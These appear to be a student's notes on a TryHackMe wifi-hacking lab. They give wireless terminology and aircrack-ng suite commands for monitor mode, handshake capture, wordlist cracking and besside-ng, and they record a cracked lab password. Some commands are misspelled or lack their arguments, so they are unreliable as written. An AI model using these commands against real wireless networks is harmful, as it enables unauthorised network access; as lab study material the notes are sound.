
# Matheus Jesus 04-04-2020

## Try Hack Me - [Wifi Hacking 101](https://tryhackme.com/room/wifihacking101)

### Key Terms

* SSID: The network "name" that you see when you try and connect
* ESSID: An SSID that *may* apply to multiple access points, eg a company office, normally forming a bigger network. For Aircrack they normally refer to the network you're attacking.
* BSSID: An access point MAC (hardware) address
* WPA2-PSK: Wifi networks that you connect to by providing a password that's the same for everyone
* WPA2-EAP: Wifi networks that you authenticate to by providing a username and password, which is sent to a RADIUS server.
* RADIUS: A server for authenticating clients, not just for wifi.

1. WPA-PSK - Password only
2. WPA-EAP - Username and Password 

### Commands

#### airmon-ng

1. sudo airmon-ng check kill 
2. sudo airmon-ng start wlan0 -> interface shall be renamed to wlan0mon

#### airdump-ng

1. sudo airdump-ng --bssid --channel -w

#### aircrack-ng

1. sudo aircrack-ng -b -w -j

**/usr/share/wordlists/rockyou.txt** wordlist

**BSSID 02:1A:11:FF:D9:BD**

Found password **greeneggsandham**

sudo aircrack-ng -b 02:1A:11:FF:D9:BD -w /usr/share/wordlists/rockyou.txt -j output NinjaJc01-01.cap

My BSSID
A2:C7:C4:9D:33:BB  

sudo airmon-ng start wlan0
sudo airodump-ng prism0
sudo aireplay-ng --test prism0
sudo besside-ng prism0 -b A2:C7:C4:9D:33:BB
